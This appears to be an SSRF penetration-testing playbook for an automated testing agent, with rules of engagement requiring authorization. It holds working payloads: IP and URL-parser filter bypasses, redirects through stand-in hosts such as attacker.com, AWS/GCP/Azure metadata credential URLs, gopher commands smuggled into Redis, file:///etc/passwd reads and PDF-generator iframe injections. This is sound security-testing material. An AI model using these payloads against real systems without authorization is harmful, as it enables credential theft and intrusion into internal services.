# Server-Side Request Forgery (SSRF)

## Scope and preconditions

Applies to any endpoint where the server makes HTTP requests based on user input:
URL fields, webhooks, file imports by URL, PDF generators, image fetchers, proxy
endpoints, OpenGraph/unfurl previews, and API integrations. SSRF is also reachable
through header injection (`Host`, `X-Forwarded-For`) and protocol handlers.

It does **not** cover: client-side request forgery (use `csrf`), open redirect
without server-side fetch (use `open-redirect`), or XXE-based SSRF (use `xxe`).

## Rules of engagement

- MUST have written authorization. SSRF testing can reach internal infrastructure.
- MUST use only benign payloads. NEVER attempt to modify or delete data on
  internal services.
- MUST use OOB/Interactsh callbacks to confirm SSRF — do not rely on response
  content alone.
- NEVER attempt to access cloud metadata credentials beyond confirming their
  existence. Show the IAM role name, not the secret key.
- NEVER use SSRF to scan the entire internal network. Demonstrate with 3-5
  known internal IPs, then stop.

## Workflow

- [ ] 1. Identify URL input points
- [ ] 2. Test basic SSRF with OOB callback
- [ ] 3. Bypass IP/URL restrictions
- [ ] 4. Access cloud metadata
- [ ] 5. Fingerprint internal services
- [ ] 6. Test protocol smuggling
- [ ] 7. Test PDF/document generator SSRF
- [ ] 8. Assess impact and record

## Step 1: Identify URL input points

### Goal
Find every parameter where the server fetches a URL.

### Actions
Use `search_responses` and `get_endpoints` for:
- Parameters named: `url`, `uri`, `src`, `href`, `link`, `target`, `redirect`,
  `callback`, `webhook`, `feed`, `import`, `fetch`, `proxy`, `image`, `avatar`
- File import features: "Import from URL", "Fetch RSS", "Add webhook"
- Preview features: link unfurling, OpenGraph, social card generation
- PDF/document generation endpoints
- Image resize/proxy endpoints

## Step 2: Basic SSRF with OOB

### Goal
Confirm the server makes requests to attacker-controlled URLs.

### Actions
1. Get an OOB URL from Interactsh.
2. Submit it in each identified URL parameter:
   ```
   url=https://COLLAB_URL/ssrf-test
   ```
3. Check for a callback. If received — SSRF confirmed.
4. Examine the callback details: User-Agent (reveals backend library),
   IP address (reveals server's egress IP), headers.

If no callback, try:
- Different URL schemes: `http://`, `https://`, `//` (protocol-relative)
- URL in different encoding: URL-encoded, double-encoded
- URL in different parameter formats: JSON body, XML body, multipart

## Step 3: Bypass IP/URL restrictions

### Goal
Circumvent allowlist/blocklist protections on the URL parameter.

### IP representation bypasses for 127.0.0.1

| Format | Payload |
|---|---|
| Decimal | `http://2130706433/` |
| Octal | `http://0177.0.0.1/` |
| Hex | `http://0x7f.0.0.1/` |
| Mixed | `http://0x7f.1/` |
| IPv6 mapped | `http://[::ffff:127.0.0.1]/` |
| IPv6 loopback | `http://[::1]/` |
| IPv6 short | `http://[0:0:0:0:0:ffff:127.0.0.1]/` |
| Zero padding | `http://127.0.0.0001/` |
| Decimal overflow | `http://127.1/` (shorthand) |

### URL parsing differential bypasses

| Technique | Payload | Why it works |
|---|---|---|
| @ bypass | `http://trusted.com@127.0.0.1/` | Parser reads `trusted.com` as username |
| Fragment | `http://127.0.0.1#@trusted.com` | Check sees `trusted.com`, fetch hits `127.0.0.1` |
| Backslash | `http://127.0.0.1\@trusted.com` | Some parsers treat `\` as path separator |
| Tab/newline | `http://127.0.0.1%09trusted.com` | Whitespace-sensitive parsing |
| Enclosed alphanumeric | `http://①②⑦.⓪.⓪.①/` | Unicode numeral normalization |

### DNS-based bypasses

| Technique | Payload |
|---|---|
| DNS rebinding | Register domain with TTL=0 that alternates between `1.2.3.4` and `127.0.0.1` |
| Wildcard DNS | `http://127.0.0.1.nip.io/`, `http://127.0.0.1.xip.io/` |
| Attacker DNS | Set up `evil.com` A record pointing to `127.0.0.1` |

### Redirect-based bypass
If the filter checks the URL but follows redirects:
```
http://attacker.com/redirect → 302 → http://127.0.0.1/
```
The check passes (attacker.com is external), the fetch follows the redirect to
internal.

Use `run_intruder_attack` to test all bypass payloads systematically.

## Step 4: Access cloud metadata

### Goal
Reach the cloud instance metadata service to obtain credentials.

### AWS IMDSv1
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```
Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token).

### AWS IMDSv2 (token required)
```
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
```
Then use the token:
```
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN
```
IMDSv2 blocks SSRF if the server cannot send PUT requests or custom headers
through the SSRF vector.

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
```
Requires header: `Metadata-Flavor: Google`. Without this header, the request
returns 403. If the SSRF vector allows custom headers, this is exploitable.

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
Requires header: `Metadata: true`.

### Impact of metadata access
- AWS credentials → full account compromise proportional to IAM role permissions
- GCP service account → project-level access
- Azure managed identity → subscription-level access

## Step 5: Fingerprint internal services

### Goal
Identify internal services reachable via SSRF.

### Common internal services

| Service | Port | Probe URL | What you get |
|---|---|---|---|
| Redis | 6379 | `http://127.0.0.1:6379/` | Redis PONG response |
| Elasticsearch | 9200 | `http://127.0.0.1:9200/` | Cluster info JSON |
| Elasticsearch | 9200 | `http://127.0.0.1:9200/_cat/indices` | All indices |
| MongoDB | 27017 | `http://127.0.0.1:27017/` | MongoDB version |
| Docker API | 2375 | `http://127.0.0.1:2375/containers/json` | All containers |
| Kubernetes | 6443 | `https://127.0.0.1:6443/api/` | API version |
| Kubernetes | 10250 | `https://127.0.0.1:10250/pods` | All pods |
| Consul | 8500 | `http://127.0.0.1:8500/v1/kv/?recurse` | All KV pairs |
| etcd | 2379 | `http://127.0.0.1:2379/v2/keys/?recursive=true` | All keys |
| Prometheus | 9090 | `http://127.0.0.1:9090/api/v1/targets` | All targets |

Test common internal IPs: `10.0.0.1`, `172.16.0.1`, `192.168.1.1`.

## Step 6: Protocol smuggling

### Goal
Use non-HTTP protocols via SSRF to interact with internal services.

### Gopher protocol
`gopher://` can send arbitrary TCP data:
```
gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0A
```
This sends `SET pwned true\r\n` to Redis on port 6379.

### dict protocol
`dict://127.0.0.1:6379/INFO` — sends INFO command to Redis.

### file protocol
`file:///etc/passwd` — read local files if the URL handler supports it.

Not all URL libraries support all protocols. Test each to see what the
backend accepts.

## Step 7: PDF/document generator SSRF

### Goal
Exploit HTML-to-PDF or document conversion endpoints.

### Technique
If the application generates PDFs from user-supplied HTML:
```html
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="600">
</iframe>
```
Or:
```html
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<link rel="stylesheet" href="http://COLLAB_URL/ssrf">
```

Common vulnerable backends: wkhtmltopdf, Puppeteer, headless Chrome, Prince,
WeasyPrint, LibreOffice.

Headless Chrome additionally supports `file://` URLs and JavaScript execution
in the PDF context.

## Step 8: Assess impact and record

### Impact ladder

| Access achieved | Severity |
|---|---|
| DNS resolution only (no HTTP response) | Informational |
| HTTP response from internal host | Low-Medium |
| Port scan of internal network | Medium |
| Read internal service data (Elasticsearch, Redis) | High |
| Cloud metadata — instance info | Medium |
| Cloud metadata — IAM credentials | Critical |
| Internal service write/execute (Redis, Docker) | Critical |

Use `add_pentest_finding` with:
- The SSRF input point and payload
- The response or OOB callback proving internal access
- What internal data was accessible
- The specific bypass technique if restrictions were present

## Known false positives

- Server fetches the URL but returns a generic error — confirm with OOB callback.
- DNS resolution without HTTP connection — this is blind SSRF, still a finding
  but lower severity.
- Cloud metadata returning 401/403 — IMDSv2 or equivalent protection is working.
  Note it as a defense, not a bypass.
- PDF generator that sanitizes URLs — the HTML is accepted but internal URLs are
  replaced or blocked before rendering.

## Reminder

SSRF severity depends entirely on what is reachable. DNS-only is informational.
Cloud metadata with credentials is critical. The three highest-value tests:
**cloud metadata** (169.254.169.254), **bypass with DNS rebinding or IP encoding**
(if direct internal IPs are blocked), and **PDF generator injection** (often
overlooked). Always start with an OOB callback to confirm, then escalate.
